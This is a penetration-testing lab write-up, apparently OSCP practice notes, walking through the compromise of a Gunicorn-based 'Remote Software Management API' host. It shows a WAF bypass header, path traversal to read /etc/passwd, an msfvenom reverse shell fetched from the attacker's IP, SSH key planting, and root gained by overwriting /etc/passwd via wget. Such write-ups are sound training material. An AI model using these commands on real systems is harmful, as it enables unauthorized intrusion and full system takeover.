@@ -1,0 +1,218 @@
+**Start 11:50 08-01-2025**
+
+---
+```
+Scope:
+192.168.247.134
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sT -sV -oN nmap 192.168.247.134 -p- -T5 -vvvv --min-rate=5000
+
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+13337/tcp open  http    syn-ack Gunicorn 20.0.4
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Remote Software Management API
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+SSH and a HTTP port on `13337`.
+
+HTTP port running **Gunicorn 20.0.4**.
+
+I found the [following blog post](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/) on a vulnerability matching this version:
+
+![](../../../assets/eb617303b99b98c8e5b0caba3bfebae9.png)
+
+Let's check the website for now.
+
+![](../../../assets/fc3527c5e80d924166e36cbaf44c5144.png)
+
+![](../../../assets/7eef5b5cf1c4b8829d1d4da1af29e7a5.png)
+
+It gives us some endpoints with the intended usage.
+
+Let's enumerate further and check for hidden directories.
+
+
+## Feroxbuster
+
+```bash
+feroxbuster --url http://192.168.247.134:13337 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+```
+
+![](../../../assets/66081e2318c7b8c7e6cba4edf94d826d.png)
+
+We don't see any hidden directories that differ from the ones on the website.
+
+
+# Initial Foothold
+
+## 13337/TCP - HTTP
+
+We start testing the endpoints one by one and find out by checking the `/logs` endpoint that the **WAF** (web app firewall) is activated:
+
+![](../../../assets/d5bd5cf5aea7e897c9742591679dad20.png)
+
+From the previously found blog we find the following:
+
+![](../../../assets/701faa46f3ed6feb72cf6d712b4c5187.png)
+
+We need to specify the following header in order to smuggle the request:
+
+```bash
+X-Forwarded-For: localhost
+```
+
+Now when we initiate our request through repeater we see the following response:
+
+![](../../../assets/46b49fc59102b0d9f1564868e412a0f6.png)
+
+>[!note]
+>Remember, *Error* = good!
+
+We get a 404 error but the text specifies that *no file has been specified*.
+
+This means we just need to issue the file path to get access, let's try it out using `/etc/passwd`.
+
+```bash
+GET /logs?file=/etc/passwd HTTP/1.1
+```
+
+![](../../../assets/7fdc6afc350738f8fcef8ccb98026f1b.png)
+
+Awesome, it worked! 
+
+We notice the *clumsyadmin* user and their `/home` directory.
+
+
+### local.txt
+
+Using this technique we can get `local.txt` right away.
+
+```bash
+GET /logs?file=/home/clumsyadmin/local.txt HTTP/1.1
+```
+
+![](../../../assets/56163778fcc100b3513e2ec9c5b7b57d.png)
+
+
+## Reverse Shell
+
+![](../../../assets/eac71c2c0ba5ef88a2e7e406fffe83d7.png)
+
+Via the `/update` endpoint we will upload a reverse shell payload created using `msfvenom`.
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f elf -o shell
+```
+
+![](../../../assets/1d5298f33cdb0125d63267fc90d833fc.png)
+
+We then add it to the request.
+
+```bash
+{
+	"user":"clumsyadmin",
+	"url":"http://192.168.45.236/shell"
+}
+```
+
+![](../../../assets/a0013608afcb231321fc3180de0ff88c.png)
+
+>[!caution]
+>Remember to switch the Request mode to *POST*.
+
+The response code is *200 - OK* which means the file has been succesfully uploaded, let's get our shell. For this we will go to the `/restart` endpoint and this should prompt the shell to work.
+
+![](../../../assets/208c3690fd79e86a418e3f1d00771156.png)
+
+Request via the endpoint wouldn't work, so I used Burp.
+
+![](../../../assets/b4437e4523222f114803afda30b8de49.png)
+
+![](../../../assets/2373c8049300fe59b5f7c6c773763093.png)
+
+Then after upgrading our shell we can get to work on escalating privileges.
+
+
+# Privilege Escalation
+
+>[!note]
+>I uploaded my `id_rsa.pub` key as `authorized_keys` to the newly created `.ssh` folder on the target so I could get an SSH shell.
+
+![](../../../assets/7422dfccab35e6e070a11ed133fe9048.png)
+
+We were not allowed to run `sudo -l`. 
+
+![](../../../assets/ac646e55573a2eb56dfb1cf1236d8c56.png)
+
+And we couldn't run `linpeas`.
+
+I then enumerated the system some more:
+
+![](../../../assets/b5a8b30b87e56e894a2faf7f4d883b0b.png)
+
+![](../../../assets/0badad6fd904e80a101fdd5d739c616a.png)
+
+![](../../../assets/267a0cc2f9476a0ed9d085f916f935a8.png)
+
+After doing some searching I found this:
+
+![](../../../assets/51904af152073b4241ae40d8cf0b26fb.png)
+
+But the problem still existed of us not being able to `chmod` the script into an executable, thus rendering it useless.
+
+![](../../../assets/d74f379a27688934aece0b73ec1b1519.png)
+
+There was another PoC but this was yet again another script.
+
+Let's check whether we can use any of the binaries.
+
+>[!info]
+>We find the `/wget` binary to be particularly useful.
+
+![](../../../assets/e5e889f1b44897285c89af484b435f9d.png)
+
+We can use the binary to overwrite the `/etc/passwd` file to upload our own `/etc/passwd` which allows us to `su` to `kali`.
+
+```bash
+/usr/bin/wget http://192.168.45.236/passwd -O /etc/passwd
+```
+
+We must now generate a new user and a new `passwd` file which we will upload:
+
+```bash
+# Generate new user
+openssl passwd -1 -salt user3 pass123
+
+# Create new passwd file
+cat > passwd                         
+user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
+
+# Overwrite existing /etc/passwd file
+wget http://192.168.45.236/passwd -O /etc/passwd
+```
+
+![](../../../assets/a3265e054a516c36b69c6b2b5742b913.png)
+
+And we have `root` privileges.
+
+
+### proof.txt
+
+![](../../../assets/b5af514643700ab38876d5f4ddef99c6.png)
+
+---
+
+**Finished 14:23 08-01-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#priv-esc #feroxbuster #Gunicorn #web-attack #request-smuggling 
